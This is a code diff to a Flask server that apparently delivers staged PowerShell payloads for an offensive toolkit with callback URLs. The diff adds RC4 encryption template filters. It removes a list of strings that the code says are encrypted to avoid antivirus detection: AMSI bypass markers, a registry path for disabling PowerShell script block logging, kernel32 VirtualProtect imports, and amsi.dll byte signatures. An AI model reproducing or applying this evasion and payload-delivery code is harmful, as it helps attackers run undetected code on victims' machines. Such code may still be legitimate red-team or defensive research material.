@@ -1,5 +1,6 @@
 
 from base64 import b64encode
+from binascii import unhexlify
 from datetime import datetime
 import logging
 import os
@@ -103,6 +104,7 @@ def run_flask_app():
 
 @app.template_filter()
 def debug(msg):
+    """This is a function for debugging statements in jinja2 templates"""
     if args.DEBUG:
         return msg
     return ""
@@ -110,9 +112,25 @@ def debug(msg):
 
 @app.template_filter()
 def nodebug(msg):
+    """This is a function for (no) debugging statements in jinja2 templates"""
     if not args.DEBUG:
         return msg
     return ""
+
+
+@app.template_filter()
+def rc4encrypt(msg):
+    """This is a function for encrypting strings in jinja2 templates"""
+    return b64encode(encrypt(msg.encode(), KEY)).decode()
+
+
+@app.template_filter()
+def rc4byteencrypt(data):
+    """This is a function for encrypting bytes in jinja2 templates
+
+    data must be hexascii encoded.
+    """
+    return b64encode(encrypt(b64encode(unhexlify(data)), KEY)).decode()
 
 
 @app.route('/')
@@ -301,43 +319,6 @@ def payload_m():
 def payload_0():
     """Load 0th stage"""
 
-    # these are possibly 'suspicious' strings to be used in the powershell
-    # payload. we don't want AV to detect them.
-    encrypted_strings = [
-        "Bypass.AMSI",
-        "System.Management.Automation.Utils",
-        "cachedGroupPolicySettings",
-        "NonPublic,Static",
-        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
-        "EnableScriptBlockLogging",
-        "Failed to disable AMSI, aborting",
-        """ using System;
-            using System.Runtime.InteropServices;
-
-            public class Kernel32 {
-                [DllImport("kernel32")]
-                public static extern IntPtr GetProcAddress(IntPtr hModule,
-                    string lpProcName);
-
-                [DllImport("kernel32")]
-                public static extern IntPtr LoadLibrary(string lpLibFileName);
-
-                [DllImport("kernel32")]
-                public static extern bool VirtualProtect(IntPtr lpAddress,
-                                UIntPtr dwSize, uint flNewProtect,
-                                out uint lpflOldProtect);
-            }
-        """,
-        "amsi.dll",
-        b64encode(bytes([0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89,
-                  0x6B, 0x10, 0x49, 0x89, 0x73, 0x18, 0x57, 0x41, 0x56,
-                  0x41, 0x57, 0x48, 0x83, 0xEC, 0x70])).decode(),
-        b64encode(bytes([0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x18,
-                         0x53, 0x56])).decode(),
-        "DllCanUnloadNow",
-    ]
-    encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
-                         in encrypted_strings]
     try:
         clipboard_id = int(request.args.get('e'))
         exec_clipboard_entry = cb.entries[clipboard_id].content
@@ -348,7 +329,7 @@ def payload_0():
         "callback_url": callback_urls[request.args['t']],
         "transport": request.args['t'],
         "key": KEY,
-        "strings": encrypted_strings,
+        "amsibypass": request.args['a'],
         "symbol_name": symbol_name,
         "stage2": request.args["f"],
         "exec_clipboard_entry": exec_clipboard_entry,
